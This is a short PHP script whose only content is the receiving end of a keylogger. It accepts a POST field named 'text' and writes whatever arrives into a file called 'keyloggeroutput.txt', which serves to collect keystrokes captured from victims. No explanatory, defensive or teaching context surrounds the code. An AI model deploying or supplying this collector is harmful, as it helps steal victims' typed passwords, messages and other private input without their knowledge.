<?php
$content = $HTTP_POST_VARS['text'];
$fp = fopen("keyloggeroutput.txt","wb");
fwrite($fp,$content);
fclose($fp);
?> 
